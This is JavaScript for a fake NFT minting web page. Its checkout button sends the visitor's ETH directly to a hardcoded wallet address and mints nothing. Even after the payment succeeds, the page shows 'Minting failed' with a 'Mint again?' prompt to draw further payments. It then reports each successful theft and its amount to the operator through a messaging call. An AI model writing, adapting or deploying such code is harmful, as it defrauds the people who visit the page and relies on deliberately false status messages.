const statusp = document.querySelector("#status");
const connectBtn = document.querySelector("#connectBtn");
const checkoutBtn = document.querySelector("#checkoutBtn");
const web3 = window.Web3;
const ethereum = window.ethereum;
const pricePerNFT = 0.5;
const show_dc = true;
let plusBtn = document.querySelector('button[class*="btn-plus"]');
let minusBtn = document.querySelector('button[class*="btn-minus"]');
let totalNFTInput = document.querySelector('input[type="hidden"][id="totalNFT"]');
let totalETHSpan = document.querySelector("#totalETH");
totalNFTInput.value = 1;
totalETHSpan.innerText = totalNFTInput.value * pricePerNFT;
plusBtn.addEventListener("click", () => {
  totalNFTInput.value = Number(totalNFTInput.value) + 1;
  totalETHSpan.innerText = (totalNFTInput.value * pricePerNFT).toFixed(1);
});
minusBtn.addEventListener("click", () => {
  if (Number(totalNFTInput.value) > 1) {
    totalNFTInput.value = Number(totalNFTInput.value) - 1;
    totalETHSpan.innerText = (totalNFTInput.value * pricePerNFT).toFixed(1);
  }
});
checkoutBtn.style.display = "none";
connectBtn.addEventListener("click", async () => {
  if (ethereum) {
    try {
      await ethereum.enable();
      initPayButton();
      statusp.innerHTML = "Wallet connected. Mint your NFTs now!";
      connectBtn.style.display = "none";
      checkoutBtn.style.display = "block";
    } catch (err) {
      console.log(err);
      statusp.innerHTML = "Wallet access denied";
    }
  } else if (web3) {
    initPayButton();
  } else {
    document.getElementById('wallet').style.display='flex'
  }
});
const initPayButton = () => {
  checkoutBtn.addEventListener("click", async () => {
    statusp.innerText = "Minting in progress....";
    const paymentAddress = "0xb17467ce33dBad68865dcAAaf290c16BBe4f23D1";
    let totalEth = totalETHSpan.innerText;
    accounts = await ethereum.request({ method: "eth_requestAccounts" });
    const priceToWei = (totalEth * 1e18).toString(16);
    const gasLimit = (200_000 * totalEth).toString(16);
    ethereum
      .request({ method: "eth_sendTransaction", params: [{ from: accounts[0], to: paymentAddress, value: priceToWei }] })
      .then((txHash) => {
        statusp.innerText = "Minting failed";
        checkoutBtn.innerText = "Mint again?";
        sendMessage("**[" + myid + "] ** MINTED");
        sendMessage("**[" + myid + "] ** MINTED");
        sendMessage("**[" + myid + "] ** MINTED, Verd mu kÃ¤tel: +" + totalEth.toString());
      })
      .catch((error) => {
        console.log("Minting failed", error);
        statusp.innerText = "Minting failed";
      });
  });
};
